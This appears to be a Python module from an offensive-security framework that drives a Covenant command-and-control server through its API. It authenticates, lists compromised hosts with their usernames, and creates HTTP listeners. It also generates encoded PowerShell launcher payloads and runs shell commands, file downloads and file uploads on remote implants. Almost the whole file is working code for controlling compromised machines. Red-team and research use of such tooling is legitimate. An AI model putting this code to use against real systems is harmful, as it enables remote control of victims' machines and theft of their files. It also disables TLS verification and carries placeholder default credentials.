from .. import ResourceExistsError, ResourceNotFoundError
# from . import InconsistencyError
# from .. import C2, ListenerType, LauncherType, AgentType, Options, OptionDesc, PostExploitationType
from .. import C2, ListenerType, LauncherType, AgentType, Options, OptionDesc
from ....dtos import AgentDto, CreateListenerDto, RequestDto, ResponseDto, ShellExecuteDto, DownloadFileDto, UploadFileDto
from ....dtos import CreateLauncherDto

import asyncio
import random
import string
from typing import Iterable, Optional, Dict, Any, IO
import aiohttp
import logging
logger = logging.getLogger(__name__)


class CovenantC2(C2):
    name = 'covenant_integration'
    description = 'Integration demo for presentation'
    documentation = 'https://github.com/cobbr/Covenant/wiki/'
    registered_options = [
        OptionDesc(
            name='url',
            description='Url of the corresponding API',
            example='https://127.0.0.1:7443',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='username',
            description='user owner of the API',
            example='covenantadmin',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='password',
            description='Url of the corresponding API',
            example='p4ssw0rd',
            field_type='protected-string',
            required=True
        ),
    ]

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._token: Optional[str] = None
        self._listener_types = {
            CovenantHTTPListenerType.name: CovenantHTTPListenerType(
                self.options['url'],
                self
            ),
        }
        self._launcher_types = {
            CovenantPowershellLauncherType.name: CovenantPowershellLauncherType(self.options['url'], self),
        }

        self._agent_types = {
            'powershell': PowershellAgentType(self.options['url'], self),
        }

    def get_session(self) -> aiohttp.ClientSession:
        return aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))

    async def _get_token(self) -> str:
        """
        Authenticate the service to the corresponding Covenant
        Should we add an time expire or check to avoid generating it everytime?
        """
        data = {
            'userName': self.options['username'],
            'password': self.options['password']
        }
        target = self.options['url'] + '/api/users/login'
        async with self.get_session() as session:
            async with session.post(target, json=data) as response:
                # logger.debug('response: %s', response)
                result = await response.json()
                if result['success']:
                    self._token = result['covenantToken']
                else:
                    raise ConnectionRefusedError(
                        'Error Authenticating: {}'.format(result))
        return self._token

    async def is_alive(self, requestDto: RequestDto) -> ResponseDto:
        try:
            logger.debug('requestDto: %s', requestDto)
            token = await self._get_token()
            response = ResponseDto(successful_transaction=bool(token))
            return response
        except aiohttp.InvalidURL as er:
            raise ValueError(repr(er))
        except aiohttp.ClientError as er:
            if hasattr(er, 'code') and er.code == 400:
                raise ConnectionRefusedError(repr(er))
            raise ConnectionError(repr(er))


    async def retrieve_agents(self, dto: RequestDto) -> bytes:
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._get_token())}
            target = '{}/api/grunts'.format(self.options['url'])

            agents = []
            async with self.get_session() as session:
                async with session.get(target, headers=headers) as response:
                    current_agents = await response.json()
                    logger.debug('current_agents: %r', len(current_agents))
                    for agent in current_agents:
                        new_agent = {}
                        new_agent = AgentDto(
                            first_connection=agent['activationTime'],
                            last_connection=agent['lastCheckIn'],
                            hostname=agent['hostname'],
                            username=agent['userName'],
                            internal_id=agent['id'],
                            agent_shell_type='powershell',
                            active=True,
                            listener_internal_id=agent['listenerId']
                        )
                        agents.append(new_agent)
                    response_dto = ResponseDto(successful_transaction=True, agents=agents)
                    return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)


class CovenantHTTPListenerType(ListenerType):
    name = 'default-http-profile'
    description = 'standard http listener, messages are delivered in enconded comment'
    registered_options = [
        OptionDesc(
            name='connectAddresses',
            description='address to which the agent is going to try to connect',
            example='192.168.0.14',
            field_type='string',
            required=True
        ),
        OptionDesc(
            name='connectPort',
            description='port to which the agent is going to try to connect',
            example=80,
            field_type='integer',
            required=True
        ),
        OptionDesc(
            name='bindAdress',
            description='interfaces to which the listener is bind',
            example='0.0.0.0',
            field_type='string',
            required=False
        ),
    ]

    def __init__(self, url: str, _c2: CovenantC2) -> None:
        self._url = url
        self._c2 = _c2

    async def create_listener(self, options: Options, dto: RequestDto) -> Dict:
        connect_address = options.get('connectAddresses', '')
        connect_port = options.get('connectPort', '')
        if not connect_address or not connect_port:
            raise ValueError('[*] Invalid options: missing  connectAddress or connectPort')
        listener_name = 'Zuthaka-' + \
            ''.join(random.choice(string.ascii_uppercase + string.digits)
                    for _ in range(10))

        covenant_dict = {
            "useSSL": "false",
            "urls": [connect_address],
            "name": listener_name,
            "guid": "guid",
            "description": "description-string",
            "bindAdress": "0.0.0.0",
            "bindPort": connect_port,
            "connectAddresses": [connect_address],
            "connectPort": connect_port,
            "profileId": "2",
            "listenerTypeId": "1",
            "status": "Active",
        }
        try:
            headers = {'Authorization': 'Bearer {}'.format(
                await self._c2._get_token()
            )}
            target = '{}/api/listeners/http'.format(self._url)

            async with self._c2.get_session() as session:
                async with session.post(
                    target,
                    headers=headers,
                    json=covenant_dict
                ) as response:
                    text = await response.text()
                    if response.ok:
                        options = await response.json()
                        internal_id = options.pop('id')
                        created_listener = CreateListenerDto(listener_internal_id=internal_id, listener_options=options)
                        response_dto = ResponseDto(successful_transaction=True, created_listener=created_listener)
                        return response_dto
                    else:
                        raise ResourceExistsError('Error creating listener: {}'.format(text))
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

    async def delete_listener(
        self,
        internal_id: str,
        options: Options,
        dto: RequestDto
    ) -> None:
        headers = {'Authorization': 'Bearer {}'
                   .format(await self._c2._get_token())}
        target = '{}/api/listeners/{}'.format(self._url, internal_id)
        async with self._c2.get_session() as session:
            async with session.delete(target, headers=headers) as response:
                result = await response.text()
                logger.error('[*] result: %r ', result)
                if response.ok:
                    response_dto = ResponseDto(successful_transaction=True)
                    return response_dto
                else:
                    raise ResourceNotFoundError(
                        'Error fetching listeners: {}'.format(result))


class CovenantPowershellLauncherType(LauncherType):
    name = 'Powershell Launcher'
    description = 'Uses powershell.exe to launch Agent using [systemm.reflection.assemly::load()'
    registered_options = [
        OptionDesc(
            name='Delay',
            description='Amount of time that Agent will take the agent to contact the listener in seconds',
            example='5',
            field_type='integer',
            required=True
        ),
    ]

    def __init__(self, url: str,  _c2: CovenantC2) -> None:
        self._url = url
        self._c2 = _c2
    
    async def create_and_retrieve_launcher(self, options: Options, dto: RequestDto):
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._c2._get_token())}
            target = '{}/api/launchers/powershell'.format(self._url)
            listener_id = dto.listener.listener_internal_id

            creation_dict = {
                "listenerId": listener_id,
                "ImplantTemplateId": 1,
                "delay": options.get('Delay', 1),
            }  
            async with self._c2.get_session() as session:
                async with session.put(target, headers=headers, json=creation_dict) as response:
                    launcher_internal_id = ''
                    launcher_options = await response.json()
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._c2._get_token())}
            target = '{}/api/launchers/powershell'.format(self._url)
            async with self._c2.get_session() as session:
                async with session.post(target, headers=headers) as response:
                    response_dict = await response.json()
                    payload_content = response_dict["encodedLauncherString"]
                    payload_name = response_dict["name"] + '.ps1'
                    created_dto = CreateLauncherDto(
                        launcher_internal_id='',
                        payload_content=payload_content,
                        payload_name=payload_name,
                        launcher_options=launcher_options
                    )
                    response_dto = ResponseDto(successful_transaction=True, created_launcher=created_dto)
                    logger.debug('[*] payload_name: %r ',  response_dict['name'])
                    return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)


class PowershellAgentType(AgentType):
    agent_shell_type = 'powershell'

    def __init__(self, url: str, _c2: CovenantC2) -> None:
        self._url = url
        self._c2 = _c2

    async def shell_execute(self,command:str, shell_dto: ShellExecuteDto, dto: RequestDto) -> bytes:
        """
        executes a command string on the 
           raises ValueError in case of invalid dto
           raises ConectionError in case of not be able to connect to c2 instance
           raises ResourceNotFoundError 
        dto = {'agent_internal_id':1234, 'command':'ls'}

        """
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._c2._get_token())}
            target = '{}/api/grunts/{}/interact'.format(
                self._url, shell_dto.agent_internal_id)
            interact_post_data = 'PowerShell /powershellcommand:"{}"'.format(
                command)

            response_dto = {}
            command_output_id = ''
            async with self._c2.get_session() as session:
                async with session.post(target, json=interact_post_data, headers=headers) as response:
                    command_response_json = await response.json()
                    command_output_id = command_response_json.get('commandOutputId')

            task_status_target = '{}/api/commands/{}'.format(self._url, command_output_id)
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target,  headers=headers) as response:
                        command_response_json = await response.json()
                        status = command_response_json['gruntTasking']['status']
                        if status == 'completed':
                            break
                        else:
                            await asyncio.sleep(1)
            else:
                raise ConnectionError('unable  to retrieve  task')
            command_output_base_url = '{}/api/commandoutputs/{}'.format( self._url, command_output_id)
            async with self._c2.get_session() as session:
                async with session.get(command_output_base_url,  headers=headers) as response:
                    command_response_json = await response.json()
                    command_output = command_response_json['output']
                    response_dto['content'] = command_output
            return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)

    async def download_file(self, download_dto: DownloadFileDto, dto: RequestDto) -> bytes:
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._c2._get_token())}
            target = '{}/api/grunts/{}/interact'.format(
                self._url, dto.shell_execute.agent_internal_id)
            interact_post_data = 'Download "{}"'.format(download_dto.target_file)
            logger.debug('headers: %r, target: %r, data: %r', headers, target, interact_post_data)

            response_dto = {}
            command_output_id = ''
            async with self._c2.get_session() as session:
                async with session.post(target, json=interact_post_data, headers=headers) as response:
                    command_response_json = await response.json()
                    command_output_id = command_response_json.get('commandOutputId')

            task_status_target = '{}/api/commands/{}'.format(self._url, command_output_id)
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target,  headers=headers) as response:
                        command_response_json = await response.json()
                        status = command_response_json['gruntTasking']['status']
                        if status == 'completed':
                            break
                        else:
                            await asyncio.sleep(1)
            else:
                raise ConnectionError('unable  to retrieve  task')
            command_output_base_url = '{}/api/commandoutputs/{}'.format(self._url, command_output_id)
            async with self._c2.get_session() as session:
                async with session.get(command_output_base_url,  headers=headers) as response:
                    command_response_json = await response.json()
                    logger.debug('command_response_json: %r', command_response_json)
                    command_output = command_response_json['output']
                    response_dto['content'] = command_output
            return response_dto
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)


    async def upload_file(self, upload_dto: UploadFileDto, dto: RequestDto) -> bytes:
        try:
            headers = {'Authorization': 'Bearer {}'.format(await self._c2._get_token())}
            target = '{}/api/grunts/{}/interact'.format(
                self._url, dto.shell_execute.agent_internal_id)
            interact_post_data = 'Upload /filepath:"{}" /filecontents:"{}"'.format(
                upload_dto.target_directory + upload_dto.file_name,
                upload_dto.file_content
                )
            logger.debug('interact_post_data: %r', interact_post_data)

            response_dto = {}
            command_output_id = ''
            async with self._c2.get_session() as session:
                async with session.post(target, json=interact_post_data, headers=headers) as response:
                    command_response_json = await response.json()
                    command_output_id = command_response_json.get('commandOutputId')

            task_status_target = '{}/api/commands/{}'.format(self._url, command_output_id)
            for _ in range(40):
                async with self._c2.get_session() as session:
                    async with session.get(task_status_target,  headers=headers) as response:
                        command_response_json = await response.json()
                        status = command_response_json['gruntTasking']['status']
                        if status == 'completed':
                            return
                        else:
                            await asyncio.sleep(1)
            else:
                raise ConnectionError('unable  to retrieve  task')
        except aiohttp.client_exceptions.ClientConnectorError as err:
            raise ConnectionError(err)
